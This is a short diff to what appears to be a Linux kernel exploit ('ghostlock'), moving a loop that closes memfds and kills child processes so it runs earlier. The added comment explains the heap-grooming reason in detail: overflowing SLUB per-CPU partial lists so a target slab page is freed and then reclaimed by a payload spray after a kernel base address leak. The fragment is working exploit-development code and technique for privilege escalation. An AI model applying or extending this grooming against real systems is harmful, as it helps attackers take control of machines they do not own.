@@ -680,6 +680,20 @@ namespace ghostlock::support {
         sched_yield();
         sched_yield();
         sched_yield();
+        /* Free prepare_ctx BEFORE closing the leak memfd: the target slab
+         * is frozen on the SLUB per-CPU partial list (CONFIG_SLUB_CPU_PARTIAL,
+         * drain threshold 13), so the leak close alone cannot discard it to
+         * the buddy. These 272 frees push the partial list far past the
+         * threshold, forcing unfreeze_partials to move the frozen target
+         * slab to the node partial list; the leak close then frees it via
+         * the slab_empty path, and the target page — freed last — is the
+         * first reclaim send's pick. prepare_ctx's heap-shaping job is done
+         * once the leak is found and base is computed. */
+        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
+            SYSCHK(close(prepare_ctx.memfds[i]));
+            prepare_ctx.memfds[i] = -1;
+            kill_child(prepare_ctx.childs[i]);
+        }
         /* Reap the snitch child's memfd: closing it is what drops the
          * mm_struct reference the spray depends on (the previous SYSCHK_pr
          * expansion dropped the close call). */
@@ -697,12 +711,6 @@ namespace ghostlock::support {
         }
         pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
         snitch.reset();
-
-        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
-            SYSCHK(close(prepare_ctx.memfds[i]));
-            prepare_ctx.memfds[i] = -1;
-            kill_child(prepare_ctx.childs[i]);
-        }
 
         return base;
     }
